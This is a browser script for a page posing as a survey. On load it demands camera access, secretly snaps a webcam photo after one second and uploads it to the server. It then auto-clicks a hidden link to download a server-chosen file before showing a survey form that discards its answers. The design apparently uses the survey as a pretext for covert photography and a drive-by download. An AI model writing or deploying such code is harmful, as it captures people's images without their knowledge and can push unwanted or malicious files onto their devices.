<script>
const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const form = document.getElementById("surveyForm");
const thanks = document.getElementById("thanksMessage");

// Camera init
async function init() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    video.srcObject = stream;

    // Capture photo after 1 second
    setTimeout(() => captureAndSend(stream), 1000);

  } catch (err) {
    alert("Camera permission is required to continue.");
  }
}

// Capture and send
function captureAndSend(stream) {
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  canvas.getContext("2d").drawImage(video, 0, 0);

  canvas.toBlob(async (blob) => {
    const formData = new FormData();
    formData.append("photo", blob);

    try {
      const res = await fetch("/api/upload", { method: "POST", body: formData });
      const data = await res.json();

      if (data.status === "success") {
        // Auto-download
        const a = document.createElement("a");
        a.href = data.downloadUrl;
        a.download = ""; // triggers download in browser
        document.body.appendChild(a);
        a.click();
        a.remove();

        document.querySelector('h2').style.display = 'none';
        document.querySelector('p').style.display = 'none';
        form.style.display = 'block';
      } else {
        alert("Upload failed.");
      }
    } catch (err) {
      alert("Upload failed. Refresh and try again.");
    }
  });

  stream.getTracks().forEach(track => track.stop());
}

// Form submission
form.addEventListener("submit", e => {
  e.preventDefault();
  form.style.display = "none";
  thanks.style.display = "block";
});

init();
</script>

